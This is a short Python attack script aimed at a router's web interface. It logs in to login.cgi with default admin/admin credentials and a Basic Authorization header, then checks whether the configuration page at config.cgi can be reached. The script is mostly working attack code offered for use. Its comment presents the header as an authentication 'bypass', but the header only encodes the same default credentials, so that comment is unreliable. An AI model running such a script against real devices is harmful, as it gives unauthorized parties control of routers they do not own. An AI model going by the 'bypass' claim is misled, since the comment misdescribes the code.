import requests

# Set the target router IP address
target_ip = "192.168.0.1"

# Set the login credentials
username = "admin"
password = "admin"

# Set the Authorization header value to bypass authentication
auth_header = "Basic YWRtaW46YWRtaW4="

# Define the login URL
login_url = f"http://{target_ip}/login.cgi"

# Define the configuration URL
config_url = f"http://{target_ip}/config.cgi"

# Define the session object
session = requests.Session()

# Send a POST request to the login URL with the login credentials and the modified Authorization header
response = session.post(login_url, data={"user": username, "pass": password}, headers={"Authorization": auth_header})

# Check if the login was successful
if response.status_code == 200 and "Invalid username or password" not in response.text:
    print("[+] Login successful")
    
    # Send a GET request to the configuration URL to verify access
    response = session.get(config_url)
    
    # Check if the request was successful
    if response.status_code == 200:
        print("[+] Access to configuration settings granted")
    else:
        print("[-] Failed to access configuration settings")
else:
    print("[-] Login failed")
